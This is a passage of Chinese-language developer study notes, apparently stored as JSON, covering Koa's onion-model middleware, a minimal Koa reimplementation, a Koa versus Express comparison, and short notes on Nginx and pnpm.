times'));\n        }\n        index = i;\n        \n        let fn = middleware[i];\n        if (i === middleware.length) fn = next;\n        if (!fn) return Promise.resolve();\n        \n        try {\n          return Promise.resolve(fn(context, dispatch.bind(null, i + 1)));\n        } catch (err) {\n          return Promise.reject(err);\n        }\n      }\n      \n      return dispatch(0);\n    };\n  }\n}\n```\n\n### 1.2. 中间件机制（洋葱模型）：示例\n\n```javascript\nconst Koa = require('koa');\nconst app = new Koa();\n\n// 中间件1\napp.use(async (ctx, next) => {\n    console.log('1 开始');\n    await next();\n    console.log('1 结束');\n});\n\n// 中间件2\napp.use(async (ctx, next) => {\n    console.log('2 开始');\n    await next();\n    console.log('2 结束');\n});\n\n// 1 开始 -> 2 开始 -> 2 结束 -> 1 结束\n```\n\n## 2. Context 对象\n\nKoa 的 Context 对象是请求的上下文，将 node 的 request 和 response 对象封装到单个对象中：\n\n```javascript\nclass Context {\n  constructor(req, res) {\n    this.req = req;\n    this.res = res;\n    this.state = {};  // 用于在中间件之间传递信息\n    \n    // 代理 request 和 response 对象的属性\n    delegate(this, 'response')\n      .method('attachment')\n      .method('redirect')\n      .access('type')\n      .access('status');\n      \n    delegate(this, 'request')\n      .method('acceptsLanguages')\n      .method('acceptsEncodings')\n      .access('querystring')\n      .access('socket');\n  }\n}\n```\n\n## 3. 错误处理机制\n\nKoa 提供了优雅的错误处理方式：\n\n```javascript  hl:10\napp.use(async (ctx, next) => {\n  try {\n    await next();\n  } catch (err) {\n    ctx.status = err.status || 500;\n    ctx.body = {\n      message: err.message\n    };\n    // 触发应用级错误事件\n    ctx.app.emit('error', err, ctx);\n  }\n});\n```\n\n## 4. 异步流程控制\n\nKoa 2.x 版本利用 `async/await` 来处理异步流程：\n\n```javascript\napp.use(async (ctx, next) => {\n  const start = Date.now();\n  await next();\n  const ms = Date.now() - start;\n  console.log(`${ctx.method} ${ctx.url} - ${ms}ms`);\n});\n```\n\n## 5. 请求和响应的封装\n\nKoa 对 Node.js 原生的 req 和 res 对象进行了封装，形成了`更易用的 Request 和 Response 对象`：\n\n```javascript\nclass Request {\n  get header() {\n    return this.req.headers;\n  }\n  \n  get method() {\n    return this.req.method;\n  }\n  \n  get url() {\n    return this.req.url;\n  }\n  \n  get query() {\n    const str = this.querystring;\n    return qs.parse(str);\n  }\n}\n\nclass Response {\n  set type(type) {\n    this.set('Content-Type', type);\n  }\n  \n  set body(val) {\n    this._body = val;\n    // 根据不同类型设置对应的 Content-Type\n    if (typeof val === 'string') this.type = 'text/plain';\n    if (Buffer.isBuffer(val)) this.type = 'application/octet-stream';\n    if (typeof val === 'object') this.type = 'application/json';\n  }\n}\n```\n\n## 6. 工作流程\n\n完整的 Koa 工作流程如下：\n\n![图片&文件](./files/20241101-28.png)\n\n## 7. 主要特点总结\n\n- 轻量级：\n\t- 核心代码量很小，但扩展性强\n- 中间件机制：\n\t- 基于洋葱模型的优雅中间件机制\n- 异步流程：\n\t- 完美支持 `async/await`\n- 上下文封装：\n\t- ==将 request 和 response 封装为单一的 context 对象==\n- 错误处理：\n\t- 统一的错误处理机制\n- 无回调地狱：\n\t- 通过 async/await 彻底解决回调问题\n\n","dfO6hF2n":"\n# Koa 与 express  对比\n\n`#nodejs` `#koa` `#express` \n\n\n## 目录\n<!-- toc -->\n ## 1. 先说主要区别 \n\n- 是否集成了 `router/static` 中间件\n- 中间件实现基于回调还是 `promise`\n\t- 导致捕获错误的的方式不一致\n\n## 2. 核心理念\n\n- Express:\n\t- \"**增强** Node.js\"的理念\n\t- 提供了完整的应用程序功能\n\t- 包含了**路由、模板**等功能在框架内\n\t- 更像是一个全能型的框架\n- Koa:\n\t- \"**修复并替代** Node.js\"的理念\n\t- 极简主义，核心功能非常精简\n\t- 通过中间件扩展功能\n\t- 更像是一个中间件框架\n\n## 3. 中间件系统\n\n### 3.1. Express  \n\n- 基于`回调`函数（Callback）\n- 中间件==按线性方式==执行\n\t- 三个参数\n\t\t- req\n\t\t- res\n\t\t- next\n- 错误处理需要特殊的**错误处理中间件**\n\n\n```javascript hl:2\n// Express 中间件示例\napp.use((req, res, next) => {\n    console.log('Start');\n    next();\n    console.log('End');\n});\n```\n\n## 4. Koa 2 \n\n- 基于 async/await\n- ==洋葱模型==（Onion model）中间件\n\t- 两个参数\n\t\t- ctx \n\t\t- next\n- 更优雅的错误处理机制\n\n```javascript hl:2\n// Koa 中间件示例\napp.use(async (ctx, next) => {\n    console.log('Start');\n    await next();\n    console.log('End');\n});\n```\n\n## 5. 异步处理\n\n### 5.1. Express\n\n- 使用回调处理异步\n- 容易陷入`回调地狱`\n- 错误处理相对复杂\n\n```javascript\n// Express 异步处理\napp.get('/users', (req, res, next) => {\n    db.users.find()\n        .then(users => res.json(users))\n        .catch(next);\n});\n```\n\n### 5.2. Koa\n\n- 原生支持 `async/await`\n- 更清晰的异步流程\n- 统一的错误处理\n\n```javascript\n// Koa 异步处理\napp.use(async ctx => {\n    const users = await db.users.find();\n    ctx.body = users;\n});\n```\n\n## 6. 上下文处理\n\n### 6.1. Express\n\n- 分离的 req 和 res 对象\n- 需要手动处理请求和响应\n\n```javascript\n// Express\napp.use((req, res) => {\n    res.send(req.query.name);\n});\n```\n\n### 6.2. Koa\n\n- 统一的 ==context 对象==\n- 封装了 request 和 response\n\n```javascript\n// Koa\napp.use(ctx => {\n    ctx.body = ctx.query.name;\n});\n```\n\n## 7. 性能比较\n\n### 7.1. Express\n\n- 更多的内置功能意味着更大的开销\n- 处理简单请求的性能很好\n- 大量中间件可能影响性能\n\n### 7.2. Koa\n\n- 更轻量级\n- 更少的内存占用\n- 在处理大量并发请求时表现更好\n\n## 8. 是否内置了路由\n\n### 8.1. Express 路由处理: 已经内置路由能力\n\n```javascript\nconst express = require('express');\nconst app = express();\n\napp.get('/api/users', (req, res) => {\n    res.json({ users: [] });\n});\n\napp.use((err, req, res, next) => {\n    res.status(500).json({ error: err.message });\n});\n```\n\n### 8.2. Koa 路由处理\n\n需要引入 `@koa/router`\n\n```javascript hl:2\nconst Koa = require('koa');\nconst Router = require('@koa/router');\n\nconst app = new Koa();\nconst router = new Router();\n\nrouter.get('/api/users', async (ctx) => {\n    ctx.body = { users: [] };\n});\n\napp.use(async (ctx, next) => {\n    try {\n        await next();\n    } catch (err) {\n        ctx.status = 500;\n        ctx.body = { error: err.message };\n    }\n});\n```\n","ADSRkHdp":"\n# 实现一个简易版的 Koa\n\n`#nodejs` `#koa` \n\n\n## 目录\n<!-- toc -->\n ## 1. 最简源码实现 \n\n### 1.1. 代码实现\n\n```javascript hl:2\nconst http = require(\"http\");\nconst EventEmitter = require(\"events\");\n\n// 实现洋葱模型的中间件组合函数\nfunction compose(middlewares) {\n  return function (context) {\n    let index = -1;\n\n    function dispatch(i) {\n      // 如果在一个中间件中多次调用 next()，则抛出错误\n      if (i <= index) {\n        return Promise.reject(new Error(\"next() called multiple times\"));\n      }\n\n      index = i;\n      const fn = middlewares[i];\n\n      if (i === middlewares.length) {\n        return Promise.resolve();\n      }\n\n      try {\n        return Promise.resolve(fn(context, () => dispatch(i + 1)));\n      } catch (err) {\n        return Promise.reject(err);\n      }\n    }\n\n    return dispatch(0);\n  };\n}\n\n// 简化版的 Koa 框架,继承自 EventEmitter\nclass MiniKoa extends EventEmitter {\n  constructor() {\n    super();\n    this.middleware = [];\n    this.context = Object.create(null);\n  }\n\n  // 注册中间件\n  use(fn) {\n    if (typeof fn !== \"function\") {\n      throw new TypeError(\"Middleware must be a function!\");\n    }\n    // 将中间件函数添加到 middleware 数组中\n    this.middleware.push(fn);\n    // 返回 this，方便链式调用\n    return this;\n  }\n\n  // 创建上下文对象\n  createContext(req, res) {\n    const context = Object.create(this.context);\n\n    // 简化版的请求和响应对象\n    context.req = req;\n    context.res = res;\n\n    // 添加常用的请求属性\n    context.method = req.method;\n    context.url = req.url;\n    context.path = req.url.split(\"?\")[0];\n\n    // 添加常用的响应方法\n    context.status = 404;\n    context.body = null;\n\n    context.set = function (key, value) {\n      res.setHeader(key, value);\n    };\n\n    return context;\n  }\n\n  // 处理请求\n  handleRequest(ctx) {\n    const fn = compose(this.middleware);\n\n    return fn(ctx)\n      .then(() => this.handleResponse(ctx))\n      .catch((err) => this.handleError(err, ctx));\n  }\n\n  // 处理响应\n  handleResponse(ctx) {\n    const body = ctx.body;\n    const res = ctx.res;\n\n    if (body === null) {\n      res.statusCode = 404;\n      res.end(\"Not Found\");\n      return;\n    }\n\n    if (typeof body === \"string\") {\n      res.setHeader(\"Content-Type\", \"text/plain\");\n      res.end(body);\n      return;\n    }\n\n    if (Buffer.isBuffer(body)) {\n      res.setHeader(\"Content-Type\", \"application/octet-stream\");\n      res.end(body);\n      return;\n    }\n\n    if (typeof body === \"object\") {\n      res.setHeader(\"Content-Type\", \"application/json\");\n      res.end(JSON.stringify(body));\n      return;\n    }\n  }\n\n  // 错误处理\n  handleError(err, ctx) {\n    console.error(err);\n    ctx.status = err.status || 500;\n    ctx.body = {\n      error: err.message || \"Internal Server Error\",\n    };\n    this.handleResponse(ctx);\n  }\n\n  // 启动服务器\n  listen(...args) {\n    const server = http.createServer(this.callback());\n    return server.listen(...args);\n  }\n\n  // 生成回调函数\n  callback() {\n    return (req, res) => {\n      const ctx = this.createContext(req, res);\n      return this.handleRequest(ctx);\n    };\n  }\n}\n\nmodule.exports = MiniKoa;\n\n```\n\n### 1.2. 主要功能\n\n1. **中间件组合函数 `compose`**：\n\t- 这个函数接受一个**中间件数组**，并返回一个函数，该函数会依次执行这些中间件。\n\t- 中间件通过调用 `next()` 来传递控制权给下一个中间件。\n\t- 如果在一个中间件中多次调用 `next()`，会抛出错误。\n1. **`MiniKoa` 类**：\n\t- 继承自 `EventEmitter`，允许实例在特定事件上注册监听器。\n\t- 包含一个 `middleware` 数组，用于存储中间件函数。\n\t- 提供了 `use` 方法来注册中间件。\n\t- 提供了 `createContext` 方法来创建上下文对象 `context`，该对象包含请求和响应的相关信息。\n\t- 提供了 `handleRequest` 方法来处理请求，调用中间件组合函数，并处理响应或错误。\n\t- 提供了 `handleResponse` 方法来处理响应，根据 `context.body` 的类型设置响应头和响应体。\n\t- 提供了 `handleError` 方法来处理错误，设置错误状态码和错误信息。\n\t- 提供了 `listen` 方法来启动 HTTP 服务器。\n\t- 提供了 `callback` 方法来生成 HTTP 服务器的回调函数。\n\n### 1.3. 为什么需要使用 `EventEmitter`\n\n`MiniKoa` 继承自 `EventEmitter`，主要是为了**提供事件驱动**的能力。以下是一些可能的用途：\n\n1. **错误处理**：\n\t- 可以在发生错误时触发特定事件，允许用户注册错误处理器。\n\t- 例如\n\t\t- 用户可以通过 `app.on('error', (err) => { ... })` 来处理全局错误。\n2. **日志记录**：\n\t- 可以在特定事件（如请求开始、请求结束）时触发事件，允许用户注册日志记录器。\n\t- 例如，用户可以通过 `app.on('request', (ctx) => { ... })` 来记录请求日志。\n3. **扩展功能**：\n\t- 允许用户在特定事件上注册自定义功能，增强框架的灵活性和可扩展性。\n\n总之，`EventEmitter` 提供了一种灵活的机制来处理异步事件，使得框架更加健壮和可扩展。\n\n## 2. 使用示例\n\n```javascript\nconst MiniKoa = require(\"./mini-koa\");\nconst app = new MiniKoa();\n\n// 记录请求日志的中间件\napp.use(async (ctx, next) => {\n  const start = Date.now();\n  console.log(`${ctx.method} ${ctx.url}`);\n\n  await next();\n\n  const ms = Date.now() - start;\n  console.log(`${ctx.method} ${ctx.url} - ${ms}ms`);\n});\n\n// 处理错误的中间件\napp.use(async (ctx, next) => {\n  try {\n    await next();\n  } catch (err) {\n    ctx.status = err.status || 500;\n    ctx.body = {\n      error: err.message,\n    };\n  }\n});\n\n// 业务逻辑中间件\napp.use(async (ctx) => {\n  if (ctx.path === \"/\") {\n    ctx.body = \"Hello MiniKoa!\";\n  } else if (ctx.path === \"/json\") {\n    ctx.body = { message: \"Hello MiniKoa!\" };\n  } else if (ctx.path === \"/error\") {\n    throw new Error(\"Oops! Something went wrong!\");\n  }\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running on http://localhost:3000\");\n});\n\n```\n\n## 3. 继续扩展\n\n这个实现虽然简化了很多细节，但保留了 Koa 的核心特性和设计理念。你可以基于这个基础版本继续添加更多功能，比如：\n1. 添加更多的上下文方法\n2. 实现请求体解析\n3. 添加更多的响应类型支持\n4. 实现静态文件服务\n5. 添加路由功能\n6. 实现 `Cookie` 支持\n\n## 4. Koa 的源码目录结构及其功能\n\nKoa 的源码结构非常精简，这也体现了它的设计理念：**保持核心简单，通过中间件扩展功能**。以下是主要目录和文件的分析：\n\n### 4.1. 根目录结构\n\n```bash\nkoa/\n├── lib/           # 核心源码目录\n├── docs/          # 文档目录\n├── test/          # 测试用例目录\n├── package.json   # 项目配置文件\n└── History.md     # 版本更新历史\n```\n\n### 4.2. lib 目录（核心源码）\n\n```bash\nlib/\n├── application.js  # 应用程序的主类\n├── context.js      # 上下文对象\n├── request.js      # 请求对象的封装\n└── response.js     # 响应对象的封装\n```\n\n让我们详细分析每个核心文件的功能：\n\n#### 4.2.1. `application.js`\n\n- 框架的核心文件，导出 Koa 类\n- 主要功能：\n\t- 中间件管理（use 方法）\n\t- 服务器创建和监听（listen 方法）\n\t- 上下文创建和处理\n\t- 错误处理机制\n\n```javascript\n// 核心代码示例\nclass Application extends Emitter {\n  constructor() {\n    super();\n    this.middleware = [];\n    this.context = Object.create(context);\n    this.request = Object.create(request);\n    this.response = Object.create(response);\n  }\n  // ...\n}\n```\n\n>  很多 Object.create()\n\n#### 4.2.2. `context.js`\n\n- 请求`上下文对象`的实现\n- 主要功能：\n\t- 封装请求和响应对象\n\t- 提供便捷的访问器属性\n\t- 错误处理方法\n\t- 状态管理\n\n```javascript \nconst context = {\n  get url() {\n    return this.request.url;\n  },\n  get body() {\n    return this.response.body;\n  },\n  set body(val) {\n    this.response.body = val;\n  },\n  // ...\n};\n```\n\n#### 4.2.3. `request.js`\n\n- HTTP 请求对象的封装\n- 主要功能：\n\t- 请求头解析\n\t- 查询字符串处理\n\t- 请求方法判断\n\t- `Content-Type` 处理\n\n```javascript\nmodule.exports = {\n  get header() {\n    return this.req.headers;\n  },\n  get method() {\n    return this.req.method;\n  },\n  // ...\n};\n```\n\n#### 4.2.4. `response.js`\n\n- HTTP 响应对象的封装\n- 主要功能：\n\t- 响应头设置\n\t- 状态码管理\n\t- 响应体处理\n\t- Content-Type 设置\n\n```javascript\nmodule.exports = {\n  get status() {\n    return this.res.statusCode;\n  },\n  set status(code) {\n    this.res.statusCode = code;\n  },\n  // ...\n};\n```\n\n#### 4.2.5. `test/` 目录\n\n- 包含完整的单元测试\n- 按功能模块划分的测试用例\n- 提供了使用示例和最佳实践\n\n#### 4.2.6. `docs/` 目录\n\n- API 文档\n- 使用指南\n- 中间件开发指南\n- 错误处理文档\n\n","rOyP8DxG":"\n# Nginx 介绍\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 正向代理与反向代理 \n\n- 总结：\n\t- 正向代理：\n\t\t- ==服务器==看不到真正的==客户端==\n\t- 反向代理：\n\t\t- ==客户端==看不到真正的==服务器==\n\n详细如下图：\n\n![图片&文件](./files/20241025-4.png)\n\n## 2. 一些基本设置\n\n- 针对特定路径，特定文件后缀，开启 `gzip on`\n- 请求限制：对 `同一 ip` 的连接数 和 并发数进行限制\n\t- imit_conn_module `连接频率`限制\n\t- limit_req_module `请求频率`限制\n- 针对特定路径，特定文件后缀，检查 referer 来源，开启**防盗链**\n\n## 3. 负载均衡\n\n![图片&文件](./files/20241025-5.png)\n\n","GnQCTMhJ":"\n# pnpm（performant npm）\n\n`#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 高效的磁盘空间利用 \n\npnpm 使用`硬链接和符号链接`来共享项目间的依赖，这意味着：\n\n- ==相同的依赖包只会在磁盘上存储一次==\n- 大大减少了磁盘空间的使用\n- 安装速度更快，因为许多包可能**已经存在于全局存储中**\n\n```\n.pnpm-store/\n  |-- node_modules/\n      |-- packageA@1.0.0\n      |-- packageB@2.0.0\n      ...\n```\n\n## 2. 严格的依赖结构\n\npnpm 创建了一个**非平铺**的 `node_modules` 结构：\n\n- **每个包只能访问其直接依赖**\n- 防止依赖提升，避免\"幽灵依赖\"问题\n- 提高了项目的可预测性和安全性\n\n``` hl:2\nnode_modules/\n  |-- .pnpm/\n      |-- packageA@1.0.0/\n      |-- packageB@2.0.0/\n  |-- packageA -> .pnpm/packageA@1.0.0/node_modules/packageA\n  |-- packageB -> .pnpm/packageB@2.0.0/node_modules/packageB\n```\n\n## 3. 快速安装\n\n- 并行安装多个包\n- 利用缓存和硬链接，减少网络和磁盘 I/O\n\n## 4. 支持 monorepo\n\npnpm 内置了对 `monorepo`（单仓多包）项目的支持：\n\n- 使用 `pnpm-workspace.yaml` 定义工作空间\n- 提供 `pnpm add -w` 命令来安装根依赖\n- 支持 `--filter` 参数来操作特定的包\n\n## 5. 兼容性\n\n- 与 npm 和 Yarn 的 `package.json` 格式完全兼容\n- 可以直接替换现有的 npm 或 Yarn 项目\n\n## 6. 其他特性\n\n- 内置对 Node.js 版本管理的支持\n- 支持插件系统\n- 提供了许多有用的命令，如 `pnpm why` 用于分析依赖关系\n\n## 7. 使用示例\n\n```bash\n# 安装依赖\npnpm install\n\n# 添加依赖\npnpm add react\n\n# 运行脚本\npnpm run build\n\n# 在工作空间中添加依赖\npnpm add -w typescript\n\n# 在特定包中添加依赖\npnpm add lodash --filter package-name\n```\n\n## 8. pnpm.lock 文件\n\npnpm 使用 `pnpm-lock.yaml` 文件来锁定依赖版本，确保团队成员和 CI 环境使用相同的依赖版本。\n\n## 9. 性能对比\n\n在大多数情况下，pnpm 的安装速度比 npm 和 Yarn 快，**尤其是在处理大型项目或 monorepo 时**。\n\n","dfyO1CIm":"\n# koa 的中间件机制\n\n`#koa` `#nodejs` \n\n\n## 目录\n<!-- toc -->\n ## 1. 中间件基本概念 \n\nKoa 的中间件是一个函数，它接收两个参数：\n- `ctx`：上下文对象，包含请求和响应信息\n- `next`：下一个中间件函数\n\n### 1.1. 基本结构\n\n```javascript\nconst Koa = require('koa');\nconst app = new Koa();\n\napp.use(async (ctx, next) => {\n    // 中间件逻辑\n    await next();\n});\n```\n\n### 1.2. 洋葱模型\n\n```javascript\napp.use(async (ctx, next) => {\n    console.log('1. 进入第一层');\n    await next();\n    console.log('6. 离开第一层');\n});\n\napp.use(async (ctx, next) => {\n    console.log('2. 进入第二层');\n    await next();\n    console.log('5. 离开第二层');\n});\n\napp.use(async (ctx, next) => {\n    console.log('3. 进入第三层');\n    ctx.body = 'Hello World';\n    console.log('4. 离开第三层');\n});\n```\n\n输出顺序：\n```\n1. 进入第一层\n2. 进入第二层\n3. 进入第三层\n4. 离开第三层\n5. 离开第二层\n6. 离开第一层\n```\n\n## 2. 常用中间件类型\n\n### 2.1. 错误处理中间件\n\n```javascript\napp.use(async (ctx, next) => {\n    try {\n        await next();\n    } catch (err) {\n        ctx.status = err.status || 500;\n        ctx.body = {\n            code: ctx.status,\n            message: err.message,\n            error: process.env.NODE_ENV === 'development' ? err.stack : undefined\n        };\n        // 触发应用级错误事件\n        ctx.app.emit('error', err, ctx);\n    }\n});\n```\n\n### 2.2. 日志中间件\n\n```javascript\napp.use(async (ctx, next) => {\n    const start = Date.now();\n    \n    // 请求日志\n    console.log(`--> ${ctx.method} ${ctx.url}`);\n    \n    await next();\n    \n    // 响应日志\n    const ms = Date.now() - start;\n    console.log(`<-- ${ctx.method} ${ctx.url} ${ctx.status} ${ms}ms`);\n});\n```\n\n### 2.3. 认证中间件\n\n```javascript\nconst jwt = require('jsonwebtoken');\n\nconst auth = async (ctx, next) => {\n    try {\n        const token = ctx.header.authorization?.split(' ')[1];\n        if (!token) {\n            ctx.throw(401, '未提供认证令牌');\n        }\n        \n        const decoded = jwt.verify(token, process.env.JWT_SECRET);\n        ctx.state.user = decoded;\n        \n        await next();\n    } catch (err) {\n        ctx.throw(401, '认证失败');\n    }\n};\n\n// 使用中间件\napp.use(auth);\n```\n\n### 2.4. 响应格式化中间件\n\n```javascript\napp.use(async (ctx, next) => {\n    await next();\n    \n    // 统一响应格式\n    if (ctx.body) {\n        ctx.body = {\n            code: ctx.status === 200 ? 0 : ctx.status,\n            data: ctx.body,\n            message: ctx.message || 'success',\n            timestamp: new Date().toISOString()\n        };\n    }\n});\n```\n\n## 3. 高级中间件模式\n\n### 3.1. 条件中间件\n\n```javascript\nconst unless = require('koa-unless');\n\nconst authMiddleware = async (ctx, next) => {\n    // 认证逻辑\n    await next();\n};\n\n// 添加除外路径\nauthMiddleware.unless = unless;\n\napp.use(authMiddleware.unless({\n    path: [/^\\/public/, '/login', '/register']\n}));\n```\n\n### 3.2. 组合中间件\n\n```javascript hl:1\nconst compose = require('koa-compose');\n\nconst middlewares = compose([\n    async (ctx, next) => {\n        // 中间件1\n        await next();\n    },\n    async (ctx, next) => {\n        // 中间件2\n        await next();\n    }\n]);\n\napp.use(middlewares);\n```\n\n### 3.3. 参数化中间件\n\n```javascript\nconst rateLimit = (options = {}) => {\n    const { interval = 60000, max = 100 } = options;\n    const store = new Map();\n    \n    return async (ctx, next) => {\n        const key = ctx.ip;\n        const now = Date.now();\n        const requests = store.get(key) || [];\n        \n        // 清理过期请求记录\n        const validRequests = requests.filter(time => now - time < interval);\n        \n        if (validRequests.length >= max) {\n            ctx.throw(429, '请求过于频繁');\n        }\n        \n        validRequests.push(now);\n        store.set(key, validRequests);\n        \n        await next();\n    };\n};\n\n// 使用中间件\napp.use(rateLimit({ interval: 60000, max: 100 }));\n```\n\n## 4. 常用第三方中间件\n\n### 4.1. 请求体解析 (koa-bodyparser)\n\n```javascript\nconst bodyParser = require('koa-bodyparser');\n\napp.use(bodyParser({\n    enableTypes: ['json', 'form'],\n    jsonLimit: '5mb',\n    formLimit: '5mb'\n}));\n```\n\n### 4.2. 静态文件服务 (koa-static)\n\n```javascript\nconst serve = require('koa-static');\nconst path = require('path');\n\napp.use(serve(path.join(__dirname, 'public')));\n```\n\n### 4.3. 路由 (koa-router)\n\n```javascript\nconst Router = require('koa-router');\nconst router = new Router();\n\nrouter.get('/', async (ctx) => {\n    ctx.body = 'Hello World';\n});\n\nrouter.post('/users', async (ctx) => {\n    // 创建用户\n});\n\napp.use(router.routes());\napp.use(router.allowedMethods());\n```\n\n### 4.4. CORS (koa-cors)\n\n```javascript\nconst cors = require('@koa/cors');\n\napp.use(cors({\n    origin: '*',\n    allowMethods: ['GET', 'POST', 'PUT', 'DELETE'],\n    allowHeaders: ['Content-Type', 'Authorization']\n}));\n```\n\n## 5. 最佳实践\n\n### 5.1. 中间件封装\n\n```javascript\n// middleware/logger.js\nmodule.exports = (options = {}) => {\n    return async (ctx, next) => {\n        const start = Date.now();\n        await next();\n        const ms = Date.now() - start;\n        \n        if (options.console) {\n            console.log(`${ctx.method} ${ctx.url} - ${ms}ms`);\n        }\n        \n        if (options.headerEnabled) {\n            ctx.set('X-Response-Time', `${ms}ms`);\n        }\n    };\n};\n```\n\n### 5.2. 异步错误处理\n\n```javascript\napp.use(async (ctx, next) => {\n    try {\n        await next();\n    } catch (err) {\n        if (err.isJoi) { // 验证错误\n            ctx.status = 400;\n            ctx.body = {\n                code: 400,\n                message: '参数验证失败',\n                details: err.details\n            };\n        } else if (err.name === 'UnauthorizedError') { // JWT 错误\n            ctx.status = 401;\n            ctx.body = {\n                code: 401,\n                message: '认证失败'\n            };\n        } else {\n            // 其他错误\n            ctx.status = err.status || 500;\n            ctx.body = {\n                code: ctx.status,\n                message: err.message\n            };\n        }\n        \n        // 记录错误日志\n        console.error(err);\n    }\n});\n```\n\n### 5.3. 中间件配置管理\n\n```javascript\n// config/middleware.js\nmodule.exports = {\n    cors: {\n        enabled: true,\n        options: {\n            origin: '*',\n            allowMethods: ['GET', 'POST', 'PUT', 'DELETE']\n        }\n    },\n    bodyParser: {\n        enabled: true,\n        options: {\n            enableTypes: ['json', 'form'],\n            jsonLimit: '5mb'\n        }\n    },\n    // 其他中间件配置\n};\n\n// app.js\nconst middlewareConfig = require('./config/middleware');\n\nif (middlewareConfig.cors.enabled) {\n    app.use(cors(middlewareConfig.cors.options));\n}\n\nif (middlewareConfig.bodyParser.enabled) {\n    app.use(bodyParser(middlewareConfig.bodyParser.options));\n}\n```\n\n>  记住要始终考虑中间件的执行顺序，并确保正确处理异步操作和错误。\n\n## 6. `next()` 前后代码的区别和特点：\n\n### 6.1. 代码执行顺序示例\n\n让我们通过一个具体的例子来说明：\n\n```javascript\nconst Koa = require('koa');\nconst app = new Koa();\n\napp.use(async (ctx, next) => {\n    console.log('1. next() 之前的代码');\n    const startTime = Date.now();     // next() 之前的代码\n    \n    await next();                     // 分界线\n    \n    const endTime = Date.now();       // next() 之后的代码\n    console.log('4. next() 之后的代码');\n    console.log(`请求耗时: ${endTime - startTime}ms`);\n});\n\napp.use(async (ctx, next) => {\n    console.log('2. 第二个中间件开始');\n    await next();\n    console.log('3. 第二个中间件结束');\n});\n\napp.use(async (ctx) => {\n    console.log('→ 到达最内层的中间件');\n    ctx.body = 'Hello World';\n});\n```\n\n执行顺序将会是：\n```\n1. next() 之前的代码\n2. 第二个中间件开始\n→ 到达最内层的中间件\n3. 第二个中间件结束\n4. next() 之后的代码\n请求耗时: XXms\n```\n\n### 6.2. next() 前后代码的主要区别\n\n#### 6.2.1. next() 之前的代码：==请求阶段==\n\n1. **请求阶段（Downstream）特点**：\n\t- 按照中间件注册的顺序**从外到内**执行\n\t- 适合做**预处理**工作\n\t- 可以==阻止请求继续向下传递==\n\t- 常见使用场景：\n     ```javascript hl:8\n     app.use(async (ctx, next) => {\n         // next() 之前：预处理\n         ctx.state.startTime = Date.now();  // 记录开始时间\n         ctx.state.requestId = generateId(); // 生成请求ID\n         const token = ctx.headers.authorization;\n         \n         if (!token) {\n             ctx.status = 401;\n             return; // 如果没有token，直接返回，不调用next()\n         }\n         \n         await next();\n     });\n     ```\n\n2. **常见用途**：\n   - 权限验证\n   - 参数验证\n   - 请求日志记录开始\n   - 设置公共变量\n   - 请求预处理\n\n#### 6.2.2. next() 之后的代码：==响应阶段==\n\n1. **响应阶段（Upstream）特点**：\n\t- 按照中间件注册的顺序**从内到外**执行\n\t- 适合做**后处理**工作\n\t- 可以==修改响应数据==\n\t- 常见使用场景：\n     ```javascript\n     app.use(async (ctx, next) => {\n         try {\n             await next();\n             // next() 之后：后处理\n             const duration = Date.now() - ctx.state.startTime;\n             // 修改响应头\n             ctx.set('X-Response-Time', `${duration}ms`);\n             // 对响应进行处理\n             if (ctx.body && typeof ctx.body === 'object') {\n                 ctx.body = {\n                     code: 0,\n                     data: ctx.body,\n                     requestId: ctx.state.requestId\n                 };\n             }\n         } catch (err) {\n             // 错误处理\n             ctx.status = err.status || 500;\n             ctx.body = { error: err.message };\n         }\n     });\n     ```\n\n2. **常见用途**：\n\t- 响应格式化\n\t- 响应时间统计\n\t- 错误处理\n\t- 日志记录完成\n\t- 清理临时资源\n\n### 6.3. 实际应用示例\n\n#### 6.3.1. 完整的日志中间件\n\n```javascript\napp.use(async (ctx, next) => {\n    // next() 之前：记录请求信息\n    const startTime = Date.now();\n    console.log(`[请求开始] ${ctx.method} ${ctx.url}`);\n    console.log('请求头:', ctx.headers);\n    \n    try {\n        await next();\n        \n        // next() 之后：记录响应信息\n        const duration = Date.now() - startTime;\n        console.log(`[请求完成] ${ctx.method} ${ctx.url}`);\n        console.log(`响应状态: ${ctx.status}`);\n        console.log(`响应时间: ${duration}ms`);\n    } catch (err) {\n        // 错误处理\n        const duration = Date.now() - startTime;\n        console.error(`[请求错误] ${ctx.method} ${ctx.url}`);\n        console.error('错误信息:', err);\n        console.log(`响应时间: ${duration}ms`);\n        throw err;\n    }\n});\n```\n\n#### 6.3.2. 响应格式化中间件\n\n```javascript\napp.use(async (ctx, next) => {\n    // next() 之前：准备工作\n    ctx.state.requestId = Math.random().toString(36).substring(7);\n    \n    await next();\n    \n    // next() 之后：统一响应格式\n    if (ctx.body) {\n        ctx.body = {\n            code: ctx.status === 200 ? 0 : ctx.status,\n            data: ctx.body,\n            requestId: ctx.state.requestId,\n            timestamp: new Date().toISOString()\n        };\n    }\n});\n```\n\n### 6.4. 注意事项\n\n1. **异步处理**：\n\t- 必须使用 `await next()` 确保异步操作按序执行\n\t- 不要忘记处理异步错误\n\n2. **状态共享**：\n\t- 使用 `ctx.state` 在中间件之间共享数据\n\t- `next()` 前设置的数据在后续中间件中可用\n\n3. **错误处理**：\n\t- 在外层中间件使用 `try-catch` 捕获错误\n\t- 可以在 `next()` 后统一处理错误响应\n\n4. **性能考虑**：\n\t- next() 前后的代码都会影响请求处理时间\n\t- 避免在中间件中进行重复的耗时操作\n\n## 7. 中间件的顺序\n\n> 不同的顺序可能会导致完全不同的结果\n\n### 7.1. 中间件顺序的基本原则\n\n#### 7.1.1. 从外到内的顺序建议：\n\n1. **错误处理中间件** → 最外层\n2. **全局通用中间件** → 第二层\n3. **第三方功能中间件** → 第三层\n4. **业务相关中间件** → 最内层\n\n让我们通过一个示例来说明：\n\n```javascript\nconst Koa = require('koa');\nconst bodyParser = require('koa-bodyparser');\nconst cors = require('@koa/cors');\nconst compress = require('koa-compress');\nconst app = new Koa();\n\n// 1. 错误处理中间件 - 最外层\napp.use(async (ctx, next) => {\n    try {\n        await next();\n    } catch (err) {\n        ctx.status = err.status || 500;\n        ctx.body = { error: err.message };\n        // 触发应用级错误事件\n        ctx.app.emit('error', err, ctx);\n    }\n});\n\n// 2. 全局通用中间件\napp.use(async (ctx, next) => {\n    const start = Date.now();\n    await next();\n    console.log(`${ctx.method} ${ctx.url} - ${Date.now() - start}ms`);\n});\n\n// 3. 第三方功能中间件\napp.use(cors());         // 